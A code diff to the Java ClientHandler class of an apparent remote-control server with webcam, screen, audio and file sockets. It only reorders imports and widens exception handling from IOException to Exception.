@@ -5,12 +5,12 @@ package br.com.introcdc.connect.server.connection;
 
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.server.ConnectServer;
-import br.com.introcdc.connect.server.components.ServerFileComponents;
-import br.com.introcdc.connect.server.components.settings.FileInfo;
-import br.com.introcdc.connect.server.gui.ServerGUI;
 import br.com.introcdc.connect.server.components.ServerAudioComponents;
 import br.com.introcdc.connect.server.components.ServerControlComponents;
+import br.com.introcdc.connect.server.components.ServerFileComponents;
 import br.com.introcdc.connect.server.components.ServerImageComponents;
+import br.com.introcdc.connect.server.components.settings.FileInfo;
+import br.com.introcdc.connect.server.gui.ServerGUI;
 import com.google.gson.JsonObject;
 
 import javax.imageio.ImageIO;
@@ -544,10 +544,10 @@ public class ClientHandler implements Runnable {
                                 }
 
                                 ConnectServer.msg(getClientInfo() + ": Arquivo recebido!");
-                            } catch (IOException exception) {
+                            } catch (Exception exception) {
                                 ConnectServer.msg(getClientInfo() + ": Erro ao receber arquivo - " + exception.getMessage());
                             }
-                        } catch (IOException exception) {
+                        } catch (Exception exception) {
                             ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao receber um arquivo do cliente");
                         }
                     }).start(), 100, TimeUnit.MILLISECONDS);
@@ -625,43 +625,43 @@ public class ClientHandler implements Runnable {
         if (viewSocket != null) {
             try {
                 viewSocket.close();
-            } catch (IOException ignored) {
+            } catch (Exception ignored) {
             }
         }
         if (webcamSocket != null) {
             try {
                 webcamSocket.close();
-            } catch (IOException ignored) {
+            } catch (Exception ignored) {
             }
         }
         if (screenSocket != null) {
             try {
                 screenSocket.close();
-            } catch (IOException ignored) {
+            } catch (Exception ignored) {
             }
         }
         if (fileSocket != null) {
             try {
                 fileSocket.close();
-            } catch (IOException ignored) {
+            } catch (Exception ignored) {
             }
         }
         if (audioServerSocket != null) {
             try {
                 audioServerSocket.close();
-            } catch (IOException ignored) {
+            } catch (Exception ignored) {
             }
         }
         if (audioUserSocket != null) {
             try {
                 audioUserSocket.close();
-            } catch (IOException ignored) {
+            } catch (Exception ignored) {
             }
         }
         if (clientSocket != null) {
             try {
                 clientSocket.close();
-            } catch (IOException ignored) {
+            } catch (Exception ignored) {
             }
         }
         if (ConnectServer.SELECTED_CLIENT == getClientId()) {
